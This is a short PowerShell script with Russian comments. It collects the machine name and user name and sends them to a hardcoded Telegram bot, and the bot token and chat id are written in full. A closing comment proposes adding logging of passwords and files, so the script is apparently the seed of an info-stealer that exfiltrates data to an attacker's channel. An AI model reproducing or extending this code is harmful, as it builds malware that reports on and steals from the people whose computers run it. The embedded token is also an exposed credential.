# script.ps1

# Проверка работы
Write-Output "Скрипт запущен!"

# Получаем имя пользователя
$pcName = $env:COMPUTERNAME
$userName = $env:USERNAME

# Отправляем сообщение через Telegram
$token = '8052149056:AAFS0uIZMO1NvlUaoHBZ8qxUnaY-kO5eQk8'
$chat_id = '-1008052149056'
$msg = [uri]::EscapeDataString("PC: $pcName | User: $userName")
Invoke-RestMethod -Uri "https://api.telegram.org/bot $token/sendMessage?chat_id=$chat_id&text=$msg"

# (Можно добавить логирование паролей, файлов и т.д.)